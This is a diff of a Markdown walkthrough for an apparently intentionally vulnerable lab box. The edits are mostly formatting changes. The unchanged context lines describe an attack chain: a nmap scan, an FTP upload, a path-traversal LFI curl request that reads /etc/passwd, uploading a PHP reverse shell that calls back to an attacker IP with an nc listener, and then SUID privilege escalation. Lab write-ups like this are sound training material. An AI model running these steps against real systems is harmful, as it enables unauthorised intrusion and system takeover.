@@ -31,7 +31,7 @@ chmod +x ./setup.sh
 sudo ./setup.sh
 ``` 
 
-*Troubleshooting*: if there is any error in setting up the environment, please ensure that:
+***Troubleshooting****: if there is any error in setting up the environment, please ensure that:
 + The Honeypot connects to the Internet.
 + Try executing:
 
@@ -56,12 +56,13 @@ Overview of vulnerabilities on the box:
 + Initial Access: Local File Inclusion (LFI).
 + Privilege Escalation: Misconfigured SUID binary.
 
-| Attack IP | 192.168.12.1  |
-| Target IP | 192.168.12.10 |
+| **Attack IP** | 192.168.12.1  |
+
+| **Target IP** | 192.168.12.10 |
 
 ***Note***: Please notice that the IP address might be varied in different environment.
 
-#### **Enumeration**
+### **Enumeration**
 We'll begin with a `nmap` scan with the tag `-sS` for half-way handshake scan (or SYN scan).
 
 ```bash
@@ -125,7 +126,7 @@ Navigating to the directory, there is an accessible `pubf.txt` file.
 
 From the `ftp` interactive shell, we run `get <file>` to download a file and `put <file>` to upload a file.
 
-[1]. Download the `pubf.txt`.
+**[1]. Download the `pubf.txt`.**
 
 ```bash
 ftp> get pubf.txt
@@ -145,7 +146,7 @@ $ cat pubf.txt
 
 → The `/var/ftp/pub/` directory seems to be an absolute location to the file `pubf.txt` ...  
 
-[2]. Upload a random file (any file of your choice).
+**[2]. Upload a random file (any file of your choice).**
 
 ```bash
 ftp> put test
@@ -204,7 +205,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Navigate to the `/development/` directory →  Click on `ABOUT US`, we are redirected to a new `about-us` page.
 
-We notice that the entry URL of the page is: `...?view=about-us.html`, which might be vulnerable to **Local File Inclusion (LFI)**. To test our theory, we utilize `curl`.
+Notice that the entry URL of the page is: `...?view=about-us.html`, which might be vulnerable to **Local File Inclusion (LFI)**. To test our theory, we utilize `curl`.
 
 ```bash
 $ curl -s http://192.168.12.10/development/index.php\?view=../../../../../../../etc/passwd
@@ -224,7 +225,7 @@ The result successfully returns the content of the `passwd` file in the target s
 #### LFI → Remote Code Execution (RCE)
 Recalling the `pubf.txt` file we discovered previously, let's us pull a reverse shell by following the below steps.
 
-[1]. Upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) onto the `ftp` file share.
+**[1]. Upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) onto the `ftp` file share.**
 
 ***Note:*** please change the `$ip` and `$port` variables of the `php-reverse-shell.php` to your Attacker IP and a random port of your choice (I chose port 80 in this case).
 
@@ -246,7 +247,7 @@ drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:50 ..
 226 Directory send OK.
 ```
 
-[2]. Set up a `nc` listener and trigger the shell.
+**[2]. Set up a `nc` listener and trigger the shell.**
 
 + On the first terminal, we set up `nc` listener.
 
@@ -275,9 +276,9 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-#### Privilege Escalation
+### Privilege Escalation
 
-##### SUID Abuse
+#### SUID Abuse
 Local enumeration divulges a misconfigured `SUID` binary that we can abuse to escalate your privilege.
 
 ```bash
